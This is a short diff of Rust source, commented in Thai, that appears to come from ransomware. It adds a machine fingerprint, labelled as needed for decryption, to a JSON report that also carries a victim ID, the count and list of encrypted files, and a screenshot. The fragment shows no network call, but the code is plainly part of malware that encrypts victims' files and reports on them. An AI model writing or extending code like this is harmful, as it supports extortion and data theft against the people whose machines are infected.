@@ -227,12 +227,16 @@ fn main() {
         .map(|p| p.to_string_lossy().to_string())
         .collect();
 
+    // ได้ machine fingerprint สำหรับ decryption
+    let machine_fingerprint = crypto::get_machine_fingerprint();
+
     // สร้าง JSON payload
     let payload = serde_json::json!({
         "victim_id": victim_id,
         "encrypted_count": encrypted_count,
         "file_list": file_list,
         "screenshot": screenshot_b64,
+        "machine_fingerprint": base64::engine::general_purpose::STANDARD.encode(&machine_fingerprint),
         "timestamp": Utc::now().timestamp()
     });
 
